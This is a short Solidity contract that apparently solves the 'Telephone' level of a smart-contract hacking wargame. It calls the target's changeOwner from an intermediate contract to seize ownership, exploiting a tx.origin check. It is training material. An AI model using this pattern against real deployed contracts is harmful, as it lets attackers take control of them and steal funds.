// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/5-Telephone.sol";

contract TelephoneAttacker {
    Telephone telephone;

    constructor (Telephone _telephone) {
        telephone = _telephone;
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}